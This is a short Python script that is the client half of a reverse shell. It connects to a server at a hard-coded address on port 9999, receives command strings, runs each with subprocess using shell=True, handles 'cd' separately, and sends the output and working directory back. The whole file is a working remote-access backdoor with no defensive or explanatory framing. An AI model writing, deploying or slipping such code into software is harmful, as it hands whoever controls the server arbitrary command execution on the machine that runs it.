import socket
import os
import subprocess

s = socket.socket()

# should be server IP address (using local IP address for now)
host = "255.255.0.0"
port = 9999

# remotely connecting to an existing socket with connect()
s.connect((host, port))

# executing commands from server and sending response
while True: 
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    
    if len(data) > 0: 
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read() 
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)





